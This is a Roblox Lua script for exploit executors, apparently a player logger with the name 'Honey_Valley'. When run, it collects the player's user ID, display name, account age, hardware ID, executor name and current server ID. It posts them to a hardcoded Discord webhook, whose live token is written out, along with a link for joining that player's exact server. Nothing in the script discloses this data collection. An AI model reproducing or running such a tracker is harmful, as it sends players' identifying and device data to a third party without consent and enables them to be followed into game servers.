if _G.Honey_Valley then
    warn("Script is already running.")
    return
end

_G.Honey_Valley = true

local http_request = http_request or request or (syn and syn.request) or (fluxus and fluxus.request) or (http and http.request)
local HttpService = game:GetService("HttpService")
local MarketplaceService = game:GetService("MarketplaceService")
local Players = game:GetService("Players")
local RbxAnalyticsService = game:GetService("RbxAnalyticsService")

local webhookURL = "https://discord.com/api/webhooks/1333068044045652008/EQAqWkM-xsP9YIjfUBa9yVTJNzay68X7gNM0ZlLq8Ejgl79ZqYyQXp2WQJLcNJ6qWXJ_"

local function getThumbnail(userId)
    local url = "https://thumbnails.roproxy.com/v1/users/avatar-headshot?userIds=" .. userId .. "&returnPolicy=PlaceHolder&size=75x75&format=Png&isCircular=false"
    local response = http_request({
        Url = url,
        Method = "GET",
        Headers = { ["Content-Type"] = "application/json" }
    })
    local data = HttpService:JSONDecode(response.Body)
    return data.data[1].imageUrl
end

local player = Players.LocalPlayer
local userId = player.UserId
local gameInfo = MarketplaceService:GetProductInfo(game.PlaceId)
local HWID = RbxAnalyticsService:GetClientId()
local gameId = game.PlaceId
local jobId = game.JobId
local executorName = identifyexecutor and identifyexecutor() or "Unknown Executor"

local payload = {
    embeds = {
        {
            color = 14177041,
            title = "Player Information",
            description = "Details about the local player.",
            thumbnail = { url = getThumbnail(userId) },
            fields = {
                { name = "💻 Game Name", value = gameInfo.Name, inline = true },
                { name = "😚 Game Link", value = "[Click to view](https://www.roblox.com/games/" .. gameId .. ")", inline = true },
                { name = "🤨 Place ID", value = tostring(gameId), inline = true },
                { name = "🤑 Username", value = "[Profile](https://www.roblox.com/users/" .. userId .. "/profile)", inline = true },
                { name = "🉑 Display Name", value = player.DisplayName, inline = true },
                { name = "📵 User ID", value = tostring(userId), inline = true },
                { name = "Account Age", value = tostring(player.AccountAge) .. " days", inline = true },
                { name = "Hardware ID", value = HWID, inline = false },
                { name = "Executor", value = executorName, inline = true },
                {
                    name = "Teleport to Player",
                    value = "[Click here to teleport](https://thehunt.click/?placeId=" .. gameId .. "&gameInstanceId=" .. jobId .. ")",
                    inline = false
                }
            },
            footer = { text = "Information sent via script" },
            timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ")
        }
    }
}

local success, errorMessage = pcall(function()
    http_request({
        Url = webhookURL,
        Method = "POST",
        Headers = { ["Content-Type"] = "application/json" },
        Body = HttpService:JSONEncode(payload)
    })
end)

if not success then
    warn("Failed to send data to the webhook: " .. tostring(errorMessage))
else
    print("Data sent successfully!")
end
